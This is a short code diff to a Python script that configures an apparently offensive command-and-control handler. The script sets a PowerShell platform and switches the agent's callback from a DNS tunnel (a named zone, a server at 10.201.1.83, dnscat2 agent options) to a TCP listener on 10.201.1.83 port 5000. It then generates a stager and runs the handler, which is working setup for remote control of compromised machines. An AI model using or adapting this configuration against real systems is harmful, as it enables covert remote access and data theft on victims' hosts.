@@ -19,26 +19,26 @@ handler = Handler()
 
 handler.setoption("PLATFORM", "POWERSHELL")
 
-handler.setoption("TRANSPORT", "DNS")
+#handler.setoption("TRANSPORT", "DNS")
 #handler.setoption("AGENTTYPE", "DNSCAT2")
 #handler.setoption("AGENTTYPE", "DNSCAT2DOWNLOADER")
-handler.setoption("ZONE", "zfs.sy.gs")
-handler.setoption("DNSSERVER", "10.201.1.83")
+#handler.setoption("ZONE", "zfs.sy.gs")
+#handler.setoption("DNSSERVER", "10.201.1.83")
 #handler.setoption("DNSTYPE", "A")
 
-#handler.setoption("TRANSPORT", "TCP")
+handler.setoption("TRANSPORT", "TCP")
 #handler.setoption("LHOST", "127.0.0.1")
-#handler.setoption("LPORT", "0")
-#handler.setoption("LHOST", "10.201.1.83")
-#handler.setoption("LPORT", "5000")
+handler.setoption("LHOST", "10.201.1.83")
+handler.setoption("LPORT", "5000")
 
 #handler.setoption("STAGEENCODING", "FALSE")
 #handler.setoption("STAGEAUTHENTICATION", "FALSE")
-handler.setoption("CHANNELENCRYPTION", "NONE")
+#handler.setoption("CHANNELENCRYPTION", "NONE")
 
 handler.generatestager()
 
-handler.generateagent("/tmp/agentfile.txt")
+#handler.setoption("STAGED", "FALSE")
+#handler.generateagent("/tmp/agentfile.txt")
 
 handler.run()
 
